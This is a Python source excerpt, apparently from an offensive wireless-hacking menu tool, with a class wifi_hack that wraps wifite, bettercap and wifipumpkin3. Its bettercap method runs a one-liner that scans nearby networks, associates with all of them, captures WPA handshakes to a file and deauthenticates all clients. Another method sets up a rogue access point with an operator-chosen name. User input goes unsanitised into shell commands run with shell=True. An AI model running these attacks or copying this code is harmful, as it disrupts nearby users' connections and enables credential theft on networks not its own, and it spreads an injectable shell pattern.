...
class wifi_hack(object):
    ...
    def wifi_auto_attack_wifite(self):
        ...
        iface = input(bcolors.GREEN + "\n(" + bcolors.DARKCYAN + "What wireless card would you like to use? " + bcolors.YELLOW + "[ex. wlan0]:" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
    ...
    def wifi_auto_attack_bettercap(self):
        while True:
            try:
                ...
                process = subprocess.Popen('bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; wifi.recon on; wifi.show; set wifi.show.sort clients desc; set ticker.commands clear; wifi.show; wifi.assoc all; wifi.assoc all wifi.handshakes.file /usr/local/opt/handshakes; wifi.deauth all"' %(iface), shell = True).wait()
                return process
            except:
                neo.attack_wifi()
                break
    ...
    def wifi_auto_attack_wifipumpkin3(self):
        print("")
        subprocess.Popen("ip addr", shell = True).wait()
        iface = input(bcolors.GREEN + "\n(" + bcolors.DARKCYAN + "What wireless card would you like to use? " + bcolors.YELLOW + "[ex. wlan0mon]:" + bcolors.GREEN + ")# " + bcolors.ENDC)
        name = input(bcolors.GREEN + "(" + bcolors.DARKCYAN + "What wifi name would you like to use?  " + bcolors.YELLOW + "[ex. cyberafrics]:" + bcolors.GREEN + ")# " + bcolors.ENDC)
        os.system('clear')
